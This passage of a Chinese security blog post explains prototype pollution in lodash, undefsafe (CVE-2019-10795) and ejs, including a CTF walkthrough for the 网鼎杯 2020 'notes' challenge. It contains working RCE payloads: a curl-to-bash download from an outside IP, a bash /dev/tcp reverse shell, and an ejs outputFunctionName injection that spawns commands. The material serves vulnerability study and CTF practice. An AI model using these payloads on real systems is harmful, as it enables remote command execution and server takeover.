+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230710100104711.png"
+                      alt="image-20230710100104711"
+                ></p>
+<p><code>setWith</code> 函数接受四个参数：</p>
+<ul>
+<li><code>object</code>：要设置值的对象。</li>
+<li><code>path</code>：表示属性路径的字符串或路径数组。</li>
+<li><code>value</code>：要设置的值。</li>
+<li><code>customizer</code>：可选的自定义函数，用于进行设置操作</li>
+</ul>
+<p>这里和上面set的污染利用路径和方法差不多，参考上面set方法就行，这里就不在具体分析了</p>
+<p>这里直接贴一个大佬的验证POC：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">var lodash= require(&#x27;lodash&#x27;);</span><br><span class="line"></span><br><span class="line">var object_1 = &#123; &#x27;a&#x27;: [&#123; &#x27;b&#x27;: &#123; &#x27;c&#x27;: 3 &#125; &#125;] &#125;;</span><br><span class="line">var object_2 = &#123;&#125;</span><br><span class="line"></span><br><span class="line">console.log(object_1.whoami);</span><br><span class="line">//lodash.setWith(object_2, &#x27;object_2[&quot;__proto__&quot;][&quot;whoami&quot;]&#x27;, &#x27;Vulnerable&#x27;);</span><br><span class="line">lodash.setWith(object_2, &#x27;__proto__.[&quot;whoami&quot;]&#x27;, &#x27;Vulnerable&#x27;);</span><br><span class="line">console.log(object_1.whoami);</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230710100329716.png"
+                      alt="image-20230710100329716"
+                ></p>
+<p>这里调试一下结果可能看的更清楚，这里为了方便，直接看最后的结果</p>
+<p>这里可以看到是已经污染成功了</p>
+<h6 id="配合-lodash-template-实现-RCE"><a href="#配合-lodash-template-实现-RCE" class="headerlink" title="配合 lodash.template 实现 RCE"></a>配合 lodash.template 实现 RCE</h6><p>Lodash.template 是 Lodash 中的一个简单的模板引擎，<strong>创建一个预编译模板方法，可以插入数据到模板中 “interpolate” 分隔符相应的位置。</strong> HTML会在 “escape” 分隔符中转换为相应实体。 在 “evaluate” 分隔符中允许执行JavaScript代码。 在模板中<strong>可以自由访问变量</strong>。 如果设置了选项对象，则会优先覆盖 <code>_.templateSettings</code> 的值</p>
+<p>在Lodash中，为了实现代码执行我们通常是污染template中的sourceURL属性</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230710102007690.png"
+                      alt="image-20230710102007690"
+                ></p>
+<ul>
+<li><p><code>sourceURL</code> 变量用于存储最终生成的 <code>sourceURL</code> 字符串。</p>
+</li>
+<li><p><code>&#39;//# sourceURL=&#39;</code> 是一个字符串，表示 <code>sourceURL</code> 的前缀部分。这是一个特殊的注释语法，用于指定源代码的 URL。</p>
+</li>
+<li><p><code>(&#39;sourceURL&#39; in options ? options.sourceURL : (&#39;lodash.templateSources[&#39; + (++templateCounter) + &#39;]&#39;))</code> 是一个条件表达式，用于确定 <code>sourceURL</code> 的值。</p>
+<ul>
+<li><p>首先，它检查 <code>options</code> 对象中是否存在 <code>sourceURL</code> 属性。如果存在，则使用该值作为 <code>sourceURL</code>。</p>
+</li>
+<li><p>如果 <code>options</code> 对象中不存在 <code>sourceURL</code> 属性，它将使用 <code>&#39;lodash.templateSources[&#39; + (++templateCounter) + &#39;]&#39;</code> 的形式来生成一个动态的 <code>sourceURL</code>。</p>
+<ul>
+<li><p><code>++templateCounter</code> 是一个计数器，用于生成唯一的模板计数器值。</p>
+</li>
+<li><p><code>&#39;lodash.templateSources[&#39; + (++templateCounter) + &#39;]&#39;</code> 生成一个形如 <code>&#39;lodash.templateSources[1]&#39;</code> 的字符串，其中数字部分递增以保证唯一性。</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>options是一个对象，source.url取到了其options.sourceurl属性，这个属性原本是没有赋值的，默认取空字符串</p>
+<p>我们可以通过原型链污染给所有的object对象都插入一个sourcurl属性，最后这个属性被拼接进new Function的第二个参数中也就是sourceurl+return+source</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">var result = attempt(function() &#123;</span><br><span class="line">        return Function(importsKeys, sourceURL + &#x27;return &#x27; + source)</span><br><span class="line">          .apply(undefined, importsValues);</span><br><span class="line">      &#125;);</span><br></pre></td></tr></table></figure></div>
+
+<p>从而造成任意命令执行</p>
+<p>但是在function中没有require函数，所以我们不能直接使用require(‘child_process’)</p>
+<p>所以我们这里使用global.process.mainModule.constructor._load代替</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">\u000areturn e =&gt; &#123;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;).toString()//&quot;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h5 id="Undefsafe-模块原型链污染（CVE-2019-10795）"><a href="#Undefsafe-模块原型链污染（CVE-2019-10795）" class="headerlink" title="Undefsafe 模块原型链污染（CVE-2019-10795）"></a>Undefsafe 模块原型链污染（CVE-2019-10795）</h5><p><code>Undefsafe</code> 是一个 JavaScript 库，用于安全地访问嵌套对象的属性和方法，以避免在访问时出现 <code>TypeError: Cannot read property &#39;x&#39; of undefined</code> 错误。但是其在低版本（&lt;2.0.3）中存在原型链污染漏洞</p>
+<p>可以利用这个漏洞修改或添加object.prototype属性</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">const undefsafe = require(&#x27;undefsafe&#x27;);</span><br><span class="line"></span><br><span class="line">const obj = &#123;</span><br><span class="line">  foo: &#123;</span><br><span class="line">    bar: &#123;</span><br><span class="line">      baz: &#x27;Hello, World!&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">const value1 = undefsafe(obj, &#x27;foo.bar.baz&#x27;);</span><br><span class="line">console.log(value1); // 输出: Hello, World!</span><br><span class="line"></span><br><span class="line">const value2 = undefsafe(obj, &#x27;foo.bar.qux&#x27;);</span><br><span class="line">console.log(value2); // 输出: undefined</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230710104926974.png"
+                      alt="image-20230710104926974"
+                ></p>
+<p>示例：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">var a = require(&quot;undefsafe&quot;);</span><br><span class="line">var object = &#123;</span><br><span class="line">    a: &#123;</span><br><span class="line">        b: &#123;</span><br><span class="line">            c: 1,</span><br><span class="line">            d: [1,2,3],</span><br><span class="line">            e: &#x27;skysec&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">console.log(object.a.b.e)</span><br><span class="line">// skysec</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230710104958529.png"
+                      alt="image-20230710104958529"
+                ></p>
+<p>由这个两个例子我们可以看到当我们访问存在的属性室友回显</p>
+<p>访问不存在的属性不在报错，而是返回undefined</p>
+<p>并且在对对象赋值，如果目标属性存在</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">var a = require(&quot;undefsafe&quot;);</span><br><span class="line">var object = &#123;</span><br><span class="line">  a: &#123;</span><br><span class="line">    b: &#123;</span><br><span class="line">      c: 1,</span><br><span class="line">      d: [1, 2, 3],</span><br><span class="line">      e: &#x27;skysec&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">console.log(object)</span><br><span class="line">a(object,&#x27;a.b.e&#x27;,&#x27;123&#x27;)</span><br><span class="line">console.log(object)</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230710105451705.png"
+                      alt="image-20230710105451705"
+                ></p>
+<p>当属性存在可以帮我们修改相应属性的值</p>
+<p>如果不存在则会帮我们在访问属性上层进行创建并赋值</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">var a = require(&quot;undefsafe&quot;);</span><br><span class="line">var object = &#123;</span><br><span class="line">  a: &#123;</span><br><span class="line">    b: &#123;</span><br><span class="line">      c: 1,</span><br><span class="line">      d: [1, 2, 3],</span><br><span class="line">      e: &#x27;skysec&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">console.log(object)</span><br><span class="line">//&#123; a: &#123; b: &#123; c: 1, d: [Array], e: &#x27;skysec&#x27; &#125; &#125; &#125;</span><br><span class="line">a(object,&#x27;a.f.e&#x27;,&#x27;123&#x27;)</span><br><span class="line">console.log(object)</span><br><span class="line">//&#123; a: &#123; b: &#123; c: 1, d: [Array], e: &#x27;skysec&#x27; &#125; ,e:&quot;123&quot;&#125; &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>上面的是关于undefsafe的一些特性，下面我详细分析一下undefsafe版本低于2.0.3存在的原型链污染漏洞</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">var a = require(&quot;undefsafe&quot;);</span><br><span class="line">var object = &#123;</span><br><span class="line">    a: &#123;</span><br><span class="line">        b: &#123;</span><br><span class="line">            c: 1,</span><br><span class="line">            d: [1,2,3],</span><br><span class="line">            e: &#x27;skysec&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">var payload = &quot;__proto__.toString&quot;;</span><br><span class="line">a(object,payload,&quot;evilstring&quot;);</span><br><span class="line">console.log(object.toString);</span><br><span class="line">// [Function: toString]</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230710113112484.png"
+                      alt="image-20230710113112484"
+                ></p>
+<p>tostring方法是本来就存在的那么我们就等于通过undefsafe去修改成我们想要执行的语句</p>
+<p>这样的话，那么当undefsafe（）函数的23参数可控的话，我们就可以污染object对象中的值</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">var a = require(&quot;undefsafe&quot;);</span><br><span class="line">var test = &#123;&#125;</span><br><span class="line">console.log(&#x27;this is &#x27; + test)  </span><br></pre></td></tr></table></figure></div>
+
+<p>这里test被当作字符串触发了tostring方法</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230710113803314.png"
+                      alt="image-20230710113803314"
+                ></p>
+<p>返回[object Object]</p>
+<p>那我们这里就可以使用undefsafe进行原型链污染</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">var a = require(&quot;undefsafe&quot;);</span><br><span class="line">var test = &#123;&#125;</span><br><span class="line">a(test,&#x27;__proto__.toString&#x27;,function()&#123; return &#x27;just a evil!&#x27;&#125;)</span><br><span class="line">console.log(&#x27;this is &#x27;+test)    // 将test对象与字符串&#x27;this is &#x27;进行拼接</span><br><span class="line">// this is just a evil!</span><br></pre></td></tr></table></figure></div>
+
+<p>我们这里通过undefsafe修改tostring的值，污染原型链</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230710113930174.png"
+                      alt="image-20230710113930174"
+                ></p>
+<p>可以看到这里输出了evil，而不是object，这就是因为我们原型链污染导致的，这里把对象当作字符串输出，就会触发tosting方法，但是当前对象没有，就会沿着原型链向上查找同时进行调用，这里输出的tostring的值正是我们上面污染的值。</p>
+<h6 id="例题-网鼎杯-2020-青龙组-notes"><a href="#例题-网鼎杯-2020-青龙组-notes" class="headerlink" title="例题 [网鼎杯 2020 青龙组]notes"></a>例题 [网鼎杯 2020 青龙组]notes</h6><p>题目源码app.js</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">var express = require(&#x27;express&#x27;);</span><br><span class="line">var path = require(&#x27;path&#x27;);</span><br><span class="line">const undefsafe = require(&#x27;undefsafe&#x27;);</span><br><span class="line">const &#123; exec &#125; = require(&#x27;child_process&#x27;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">var app = express();</span><br><span class="line">class Notes &#123;</span><br><span class="line">    constructor() &#123;</span><br><span class="line">        this.owner = &quot;whoknows&quot;;</span><br><span class="line">        this.num = 0;</span><br><span class="line">        this.note_list = &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    write_note(author, raw_note) &#123;</span><br><span class="line">        this.note_list[(this.num++).toString()] = &#123;&quot;author&quot;: author,&quot;raw_note&quot;:raw_note&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    get_note(id) &#123;</span><br><span class="line">        var r = &#123;&#125;</span><br><span class="line">        undefsafe(r, id, undefsafe(this.note_list, id));</span><br><span class="line">        return r;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    edit_note(id, author, raw) &#123;</span><br><span class="line">        undefsafe(this.note_list, id + &#x27;.author&#x27;, author);</span><br><span class="line">        undefsafe(this.note_list, id + &#x27;.raw_note&#x27;, raw);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    get_all_notes() &#123;</span><br><span class="line">        return this.note_list;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    remove_note(id) &#123;</span><br><span class="line">        delete this.note_list[id];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var notes = new Notes();</span><br><span class="line">notes.write_note(&quot;nobody&quot;, &quot;this is nobody&#x27;s first note&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.set(&#x27;views&#x27;, path.join(__dirname, &#x27;views&#x27;));</span><br><span class="line">app.set(&#x27;view engine&#x27;, &#x27;pug&#x27;);</span><br><span class="line"></span><br><span class="line">app.use(express.json());</span><br><span class="line">app.use(express.urlencoded(&#123; extended: false &#125;));</span><br><span class="line">app.use(express.static(path.join(__dirname, &#x27;public&#x27;)));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.get(&#x27;/&#x27;, function(req, res, next) &#123;</span><br><span class="line">  res.render(&#x27;index&#x27;, &#123; title: &#x27;Notebook&#x27; &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.route(&#x27;/add_note&#x27;)</span><br><span class="line">    .get(function(req, res) &#123;</span><br><span class="line">        res.render(&#x27;mess&#x27;, &#123;message: &#x27;please use POST to add a note&#x27;&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(function(req, res) &#123;</span><br><span class="line">        let author = req.body.author;</span><br><span class="line">        let raw = req.body.raw;</span><br><span class="line">        if (author &amp;&amp; raw) &#123;</span><br><span class="line">            notes.write_note(author, raw);</span><br><span class="line">            res.render(&#x27;mess&#x27;, &#123;message: &quot;add note sucess&quot;&#125;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            res.render(&#x27;mess&#x27;, &#123;message: &quot;did not add note&quot;&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(&#x27;/edit_note&#x27;)</span><br><span class="line">    .get(function(req, res) &#123;</span><br><span class="line">        res.render(&#x27;mess&#x27;, &#123;message: &quot;please use POST to edit a note&quot;&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(function(req, res) &#123;</span><br><span class="line">        let id = req.body.id;</span><br><span class="line">        let author = req.body.author;</span><br><span class="line">        let enote = req.body.raw;</span><br><span class="line">        if (id &amp;&amp; author &amp;&amp; enote) &#123;</span><br><span class="line">            notes.edit_note(id, author, enote);</span><br><span class="line">            res.render(&#x27;mess&#x27;, &#123;message: &quot;edit note sucess&quot;&#125;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            res.render(&#x27;mess&#x27;, &#123;message: &quot;edit note failed&quot;&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(&#x27;/delete_note&#x27;)</span><br><span class="line">    .get(function(req, res) &#123;</span><br><span class="line">        res.render(&#x27;mess&#x27;, &#123;message: &quot;please use POST to delete a note&quot;&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(function(req, res) &#123;</span><br><span class="line">        let id = req.body.id;</span><br><span class="line">        if (id) &#123;</span><br><span class="line">            notes.remove_note(id);</span><br><span class="line">            res.render(&#x27;mess&#x27;, &#123;message: &quot;delete done&quot;&#125;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            res.render(&#x27;mess&#x27;, &#123;message: &quot;delete failed&quot;&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(&#x27;/notes&#x27;)</span><br><span class="line">    .get(function(req, res) &#123;</span><br><span class="line">        let q = req.query.q;</span><br><span class="line">        let a_note;</span><br><span class="line">        if (typeof(q) === &quot;undefined&quot;) &#123;</span><br><span class="line">            a_note = notes.get_all_notes();</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            a_note = notes.get_note(q);</span><br><span class="line">        &#125;</span><br><span class="line">        res.render(&#x27;note&#x27;, &#123;list: a_note&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(&#x27;/status&#x27;)</span><br><span class="line">    .get(function(req, res) &#123;</span><br><span class="line">        let commands = &#123;</span><br><span class="line">            &quot;script-1&quot;: &quot;uptime&quot;,</span><br><span class="line">            &quot;script-2&quot;: &quot;free -m&quot;</span><br><span class="line">        &#125;;</span><br><span class="line">        for (let index in commands) &#123;</span><br><span class="line">            exec(commands[index], &#123;shell:&#x27;/bin/bash&#x27;&#125;, (err, stdout, stderr) =&gt; &#123;</span><br><span class="line">                if (err) &#123;</span><br><span class="line">                    return;</span><br><span class="line">                &#125;</span><br><span class="line">                console.log(`stdout: $&#123;stdout&#125;`);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        res.send(&#x27;OK&#x27;);</span><br><span class="line">        res.end();</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(function(req, res, next) &#123;</span><br><span class="line">  res.status(404).send(&#x27;Sorry cant find that!&#x27;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(function(err, req, res, next) &#123;</span><br><span class="line">  console.error(err.stack);</span><br><span class="line">  res.status(500).send(&#x27;Something broke!&#x27;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">const port = 8080;</span><br><span class="line">app.listen(port, () =&gt; console.log(`Example app listening at http://localhost:$&#123;port&#125;`))</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230710114805388.png"
+                      alt="image-20230710114805388"
+                ></p>
+<p>可以看到这个查看和编辑note时会调用undefsafe方法</p>
+<p>分析一下路由：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">app.route(&#x27;/status&#x27;)</span><br><span class="line">    .get(function(req, res) &#123;</span><br><span class="line">        let commands = &#123;</span><br><span class="line">            &quot;script-1&quot;: &quot;uptime&quot;,</span><br><span class="line">            &quot;script-2&quot;: &quot;free -m&quot;</span><br><span class="line">        &#125;;</span><br><span class="line">        for (let index in commands) &#123;</span><br><span class="line">            exec(commands[index], &#123;shell:&#x27;/bin/bash&#x27;&#125;, (err, stdout, stderr) =&gt; &#123;</span><br><span class="line">                if (err) &#123;</span><br><span class="line">                    return;</span><br><span class="line">                &#125;</span><br><span class="line">                console.log(`stdout: $&#123;stdout&#125;`);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        res.send(&#x27;OK&#x27;);</span><br><span class="line">        res.end();</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure></div>
+
+<p>可以看到在status路由下面有一个exec命令执行函数那我们可以通过控制commands。去执行我们想要执行的命令</p>
+<p>继续分析其他路由，找传参点</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">app.route(&#x27;/edit_note&#x27;)</span><br><span class="line">    .get(function(req, res) &#123;</span><br><span class="line">        res.render(&#x27;mess&#x27;, &#123;message: &quot;please use POST to edit a note&quot;&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(function(req, res) &#123;</span><br><span class="line">        let id = req.body.id;</span><br><span class="line">        let author = req.body.author;</span><br><span class="line">        let enote = req.body.raw;</span><br><span class="line">        if (id &amp;&amp; author &amp;&amp; enote) &#123;</span><br><span class="line">            notes.edit_note(id, author, enote);</span><br><span class="line">            res.render(&#x27;mess&#x27;, &#123;message: &quot;edit note sucess&quot;&#125;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            res.render(&#x27;mess&#x27;, &#123;message: &quot;edit note failed&quot;&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure></div>
+
+<p>这里接受三个参数，id，author，raw&#x3D;&gt;enote</p>
+<p>然后执行 notes.edit_note(id, author, enote);</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">edit_note(id, author, raw) &#123;</span><br><span class="line">       undefsafe(this.note_list, id + &#x27;.author&#x27;, author);</span><br><span class="line">       undefsafe(this.note_list, id + &#x27;.raw_note&#x27;, raw);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>可以看到这些调用了undefsafe，而且后两个参数都是可控的，那我们这里就可以通过undefsafe方法进行原型链污染</p>
+<p>而且这里最终修改的是note_list中的值</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">exec(commands[index], &#123;shell:&#x27;/bin/bash&#x27;&#125;, (err, stdout, stderr) =&gt; &#123;</span><br></pre></td></tr></table></figure></div>
+
+<p>但是可以看到我们这里执行的commands</p>
+<p>不过commands和note_list的原型是一样的都是Object.prototype</p>
+<p>所以我们污染note_list其实就是污染了Object.prototype中的值</p>
+<p>当commands在自身对象中找不到我们要执行的命令就会沿着原型链向上查找。而且这里是一个遍历，遍历会沿着原型链向上查找，那么在遍历 <code>commands</code> 时便会取到我们污染进去的恶意命令并执行。</p>
+<p>payload：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=__proto__.a&amp;author=curl http://1.15.75.117/shell.txt|bash&amp;raw=a;</span><br></pre></td></tr></table></figure></div>
+
+<p>shell.txt:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/174.1.62.169/9999 0&gt;&amp;1</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>这样我们在note_list的__proto__objetc中添加了一个a属性的值，内容为curl <a class="link"   href="http://1.15.75.117/shell.txt|bash,%E7%84%B6%E5%90%8E%E5%8F%8D%E5%BC%B9shell" >http://1.15.75.117/shell.txt|bash,然后反弹shell <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">for (let index in commands) &#123;</span><br><span class="line">            exec(commands[index], &#123;shell:&#x27;/bin/bash&#x27;&#125;, (err, stdout, stderr) =&gt; &#123;</span><br><span class="line">                if (err) &#123;</span><br><span class="line">                    return;</span><br><span class="line">                &#125;</span><br><span class="line">                console.log(`stdout: $&#123;stdout&#125;`);</span><br><span class="line">            &#125;);</span><br></pre></td></tr></table></figure></div>
+
+<p>这里再遍历的时候会遍历到object中的命令从而进行命令执行</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230710121647348.png"
+                      alt="image-20230710121647348"
+                ></p>
+<h5 id="Lodash配合ejs模板引擎实现-RCE-CVE-2022-29078"><a href="#Lodash配合ejs模板引擎实现-RCE-CVE-2022-29078" class="headerlink" title="Lodash配合ejs模板引擎实现 RCE CVE-2022-29078"></a>Lodash配合ejs模板引擎实现 RCE CVE-2022-29078</h5><p>nodejs的ejs模板引擎存在一个利用原型链污染的进行rce的一个漏洞</p>
+<p>但是我们想要实现rce就要先进行原型链污染，这里使用lodash,merge方法中的原型链污染漏洞</p>
+<p>app.js</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">var express = require(&#x27;express&#x27;);</span><br><span class="line">var lodash = require(&#x27;lodash&#x27;);</span><br><span class="line">var ejs = require(&#x27;ejs&#x27;);</span><br><span class="line"></span><br><span class="line">var app = express();</span><br><span class="line">//设置模板的位置与种类</span><br><span class="line">app.set(&#x27;views&#x27;, __dirname);</span><br><span class="line">app.set(&#x27;views engine&#x27;,&#x27;ejs&#x27;);</span><br><span class="line"></span><br><span class="line">//对原型进行污染</span><br><span class="line">var malicious_payload = &#x27;&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(\&#x27;child_process\&#x27;).exec(\&#x27;calc\&#x27;);var __tmp2&quot;&#125;&#125;&#x27;;</span><br><span class="line">lodash.merge(&#123;&#125;, JSON.parse(malicious_payload));</span><br><span class="line"></span><br><span class="line">//进行渲染</span><br><span class="line">app.get(&#x27;/&#x27;, function (req, res) &#123;</span><br><span class="line">    res.render (&quot;index.ejs&quot;,&#123;</span><br><span class="line">        message: &#x27;whoami test&#x27;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">//设置http</span><br><span class="line">var server = app.listen(8000, function () &#123;</span><br><span class="line"></span><br><span class="line">    var host = server.address().address</span><br><span class="line">    var port = server.address().port</span><br><span class="line"></span><br><span class="line">    console.log(&quot;应用实例，访问地址为 http://%s:%s&quot;, host, port)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>index.ejs</li>
+</ul>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;&lt;%= message%&gt;&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>这里运行程序后就会弹出计算器</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230710124022036.png"
+                      alt="image-20230710124022036"
+                ></p>
+<p>可以看到运行之后就会弹出计算器，说明我们的命令执行了</p>
+<p>分析源码：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">lodash.merge(&#123;&#125;, JSON.parse(malicious_payload));</span><br></pre></td></tr></table></figure></div>
+
+<p>这里就是我们命令执行的核心</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230710124443395.png"
+                      alt="image-20230710124443395"
+                ></p>
+<p>我们从res.render开始分析</p>
+<p>跟进render方法</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:/Users/guoju/AppData/Roaming/Typora/typora-user-images/image-20230710151600520.png"
+                      alt="image-20230710151600520"
+                ></p>
+<p>可以看到在__proto__中污染了一个 <code>outputFunctionName</code>属性值为</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">_tmp1;global.process.mainModule.require(\&#x27;child_process\&#x27;).exec(\&#x27;calc\&#x27;);var __tmp2</span><br></pre></td></tr></table></figure></div>
+
+<p>那么这里就引发出一个问题:</p>
+<p>我们为什么要在原型链中污染一个outputFunctionName属性</p>
+<p>继续往下面分析：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">lodash.merge(&#123;&#125;, JSON.parse(malicious_payload));</span><br></pre></td></tr></table></figure></div>
+
+<p>那么这里就是实现了污染了一个outputFunctionName属性</p>
